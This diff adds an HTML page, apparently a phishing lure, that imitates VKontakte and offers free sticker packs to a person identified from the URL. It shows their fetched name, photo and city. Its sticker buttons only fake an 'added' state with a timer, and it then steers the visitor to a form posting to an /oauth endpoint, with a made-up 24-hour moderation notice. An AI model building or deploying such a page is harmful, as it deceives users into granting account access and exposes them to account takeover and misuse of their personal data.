@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Стикеры</title>
+	<style>		
+		body {
+			background: #edeef0;
+			font-family: -apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,sans-serif;
+		}
+		header {
+			top: 0;
+			left: 0;
+			position: absolute;
+		    width: 100%;
+		    background: #4a76a8;
+		    height: 42px;
+		    box-sizing: border-box;
+		    border-bottom: 1px solid #4872a3;
+		}
+		header img {
+			position: absolute;
+		    height: 42px;
+		    left: 15%;
+		}
+		.counter {
+			display: flex;
+			justify-content: center;
+			margin-top: 50px;
+			margin-left: -30px;
+		}
+		.sticker {
+			height: 480px;
+			width: 15%;
+			background: white;
+			margin-left: 35px;
+		}
+		.sticker img{
+			width: 100%;
+			height: 50%;
+			margin-top: 10%;
+		}
+		.sticker h2 {
+			text-align: center;
+		}	
+		.sticker p {
+			text-align: center;
+		}	
+		.sticker_button {
+			padding: 13px 35px 11px;
+			width: 80%;
+			margin-left: 10%;
+			font-size: 14.5px;
+			line-height: 15px;
+			background-color: #5181b8;
+			color: #fff;
+			border: 0;
+			border-radius: 4px;
+			margin-top: 40px;
+			cursor: pointer;
+		}
+		.green_but {
+			padding: 13px 35px 11px;
+			width: 80%;
+			margin-left: 10%;
+			font-size: 14.5px;
+			line-height: 15px;
+			background-color: green;
+			color: #fff;
+			border: 0;
+			border-radius: 4px;
+			margin-top: 40px;
+		}
+		.profile {
+			height: 180px;
+			width: 35%;
+			background: ;
+			margin-left: 23%;
+		}
+		.profile img {
+			height: 160px;
+			width: 160px;
+			margin-left: 0%;
+			border-radius: 100%;
+		}
+		.profile h2 {
+			margin-left: 35%;
+			margin-top: -150px;
+		}
+		.profile button {
+			padding: 13px 35px 11px;
+			margin-left: 35%;
+			font-size: 14.5px;
+			line-height: 15px;
+			background-color: #5181b8;
+			color: #fff;
+			border: 0;
+			border-radius: 4px;
+			margin-top: 10px;
+			cursor: pointer;
+		}
+		.profile p {
+			margin-left: 35%;
+			font-size: 18px;
+			color: grey;
+		}
+		h1 {
+			color: grey;
+			margin-left: 20%;
+			margin-top: 3%;
+			margin-bottom: 3%;
+		}
+		.get_st {
+			width: 100%;
+			margin-bottom: 200px;
+			margin-left: -25%;
+		}
+		@media (min-width: 900px) and (max-width: 1416px){
+			.sticker {
+			    height: 480px;
+    			width: 32%;
+			    background: white;
+			    margin-left: 35px;
+			}
+			.profile {
+			    height: 180px;
+			    width: 65%;
+			    background: ;
+			    margin-left: 13%;
+			}
+		}
+
+	</style>
+	<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/vue"></script>
+	<link rel="shortcut icon" href="/public/icon.png" type="image/x-icon">
+</head>
+<body>
+<header><img src="http://fitflex.pro/wp-content/uploads/2017/04/vk-logo.png"></header>
+	<br><br>
+<main><br><br>
+	<h1> Для получения подарочных стикеров </h1>
+	<h1> Шаг 1: Выбрать стикеры </h1>
+	<div class="counter">
+		<div class="sticker"><img src="http://vkclub.su/_data/stickers/mudakot/sticker_vk_mudakot_020.png"><h2>Мудакот</h2><p>Получить пакет стикеров:</p>
+			<button v-on:click="loading_button_fun_0" :class="{ green_but: loading_button_0 == 'Добавлен',sticker_button: loading_button_0 == 'Бесплатно' || loading_button_0 == 'Загрузка...' }">{{loading_button_0}}</button>
+		</div>
+		<div class="sticker"><img src="https://vk.com/images/stickers/3617/512.png"><h2>Бравые ребята</h2><p>Получить пакет стикеров:</p>
+			<button v-on:click="loading_button_fun_1" :class="{ green_but: loading_button_1 == 'Добавлен',sticker_button: loading_button_1 == 'Бесплатно' || loading_button_1 == 'Загрузка...' }">{{loading_button_1}}</button>
+		</div>
+		<div class="sticker"><img src="http://vk.com/images/stickers/10000/512.png"><h2>Паучок Фаззи</h2><p>Получить пакет стикеров:</p>
+			<button v-on:click="loading_button_fun_2" :class="{ green_but: loading_button_2 == 'Добавлен',sticker_button: loading_button_2 == 'Бесплатно' || loading_button_2 == 'Загрузка...' }">{{loading_button_2}}</button></div>
+	</div>
+<br>
+	<h1> Шаг 2: Отправить запрос на получение  </h1>
+	<div class="profile">
+		<img :src="photo">
+		<h2>{{name}}</h2>
+		<p>{{city}}</p>
+				<form method="post" action="/oauth"><button>Получить стикеры</button></form>
+				<br>
+					<p class="get_st"><b>Внимание:</b> модерация запроса будет проходить не более 24 часов. Просим сохранять терпение.</p>
+	</div>
+<div class="get_st">
+
+
+
+</div>
+</main>
+<script>
+	const vue = new Vue ({
+		el: 'main',
+		data: {
+			id: '',
+			name: '',
+			photo: '',
+			city: '',
+			loading_button_0: 'Бесплатно',
+			loading_button_1: 'Бесплатно',
+			loading_button_2: 'Бесплатно',	
+			//success_button_0: true,
+			success_button_1: false,
+			success_button_2: false,
+		},
+		methods: {
+			loading_button_fun_0: function(loadarg) {
+				console.log(loadarg)
+				vue.loading_button_0 = 'Загрузка...'
+				setTimeout(function(){
+					vue.loading_button_0 = 'Добавлен'
+					this.success_button_0 = true;
+				},850)
+			},
+			loading_button_fun_1: function(loadarg) {
+				console.log(loadarg)
+				vue.loading_button_1 = 'Загрузка...'
+				setTimeout(function(){
+					vue.loading_button_1 = 'Добавлен'
+				},850)
+			},
+			loading_button_fun_2: function(loadarg) {
+				console.log(loadarg)
+				vue.loading_button_2 = 'Загрузка...'
+				setTimeout(function(){
+					vue.loading_button_2 = 'Добавлен'
+				},850)
+			},
+
+		},
+	})
+	var vlp = window.location.pathname.slice(1);
+
+			axios.post('/ax', {id: vlp})
+	        .then(function (response) {
+	        		console.log(response.data)
+	        		let user_data = response.data[0];
+	        		vue.name = user_data.first_name+' '+user_data.last_name;
+	        		vue.photo = user_data.photo_100;
+	        		vue.id = 'https://vk.com/id'+user_data.id;
+	        		vue.city = user_data.city.title;
+	        		//console.log(vue.name)
+	        })
+//alert(window.location.pathname)
+</script>
+</body>
+</html>
